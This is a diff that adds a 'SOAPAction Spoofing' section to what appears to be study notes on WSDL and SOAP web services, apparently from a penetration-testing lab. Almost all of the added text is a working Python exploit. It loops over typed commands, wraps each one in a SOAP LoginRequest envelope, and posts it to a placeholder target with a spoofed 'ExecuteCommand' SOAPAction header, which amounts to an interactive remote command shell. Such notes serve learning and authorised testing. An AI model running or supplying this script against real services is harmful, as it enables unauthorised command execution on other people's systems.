@@ -124,3 +124,20 @@ Definition – Root element containing namespaces, types, messages, operations, 
 
 <img width="578" height="50" alt="image" src="https://github.com/user-attachments/assets/52f55c9f-807a-4bd8-b420-7492a00a0e64" />
 
+# SOAPAction Spoofing
+
+import requests
+
+while True:
+    cmd = input("$ ")
+    payload = f'''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
+ xmlns:tns="http://tempuri.org/">
+  <soap:Body>
+    <LoginRequest xmlns="http://tempuri.org/">
+      <cmd>{cmd}</cmd>
+    </LoginRequest>
+  </soap:Body>
+</soap:Envelope>'''
+    print(requests.post("http://<TARGET IP>:3002/wsdl",
+        data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
